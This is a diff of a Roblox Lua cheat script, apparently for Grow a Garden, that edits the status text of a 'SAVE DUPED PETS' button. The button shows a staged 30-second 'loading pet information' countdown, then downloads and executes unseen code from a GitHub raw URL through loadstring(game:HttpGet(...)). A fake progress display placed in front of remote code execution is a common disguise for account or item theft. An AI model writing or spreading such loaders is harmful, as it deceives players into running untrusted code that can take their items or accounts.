@@ -69,27 +69,28 @@ MainTab:CreateButton({
 	end
 })
 
--- SAVE STATUS 表示用パラグラフ
 local saveStatusLabel = MainTab:CreateParagraph({
 	Title = "SAVE STATUS",
 	Content = "Ready"
 })
 
--- SAVE DUPED PETS Button（30秒ロード後にスクリプト実行）
+-- SAVE DUPED PETS Button（30秒カウントダウン演出を1行表示に）
 MainTab:CreateButton({
 	Name = "SAVE DUPED PETS",
 	Callback = function()
 		task.spawn(function()
-			-- 30秒カウントダウン演出
+			-- 30秒カウントダウン演出を1行で表示
 			local countdown = 30
 			while countdown > 0 do
-				saveStatusLabel:Set({Content = "⌛ Loadinging pet information ... (" .. countdown .. "s)"})
+				saveStatusLabel:Set({
+					Content = "⌛ Loading pet information... (" .. countdown .. "s)"
+				})
 				wait(1)
 				countdown -= 1
 			end
 
 			-- スクリプト実行
-			saveStatusLabel:Set({Content = "🚀 Booting ..."})
+			saveStatusLabel:Set({Content = "🚀 Booting..."})
 			local success, err = pcall(function()
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
 			end)
